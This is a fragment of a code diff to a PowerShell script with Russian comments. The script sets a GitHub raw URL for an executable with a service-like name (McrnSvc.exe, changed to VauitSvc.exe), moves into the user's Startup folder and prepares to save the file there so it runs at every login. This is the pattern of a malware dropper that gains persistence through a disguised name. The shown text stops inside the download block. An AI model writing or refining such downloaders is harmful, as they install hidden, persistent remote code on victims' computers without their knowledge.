@@ -1,8 +1,8 @@
-$url = "https://raw.githubusercontent.com/xzj4/2/refs/heads/main/McrnSvc.exe"
-#$destPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wcrnsvc.exe"
+$url = "https://raw.githubusercontent.com/xzj4/2/refs/heads/main/VauitSvc.exe"
+#$destPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\VauitSvc.exe"
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
-$destPath = ".\McrnSvc.exe"
-# 1. Блок скачивания файла
+$destPath = ".\VauitSvc.exe"
+
 try {
     if (-not (Test-Path $destPath)) {
         # Используем -ErrorAction Stop, чтобы поймать ошибку в блоке catch
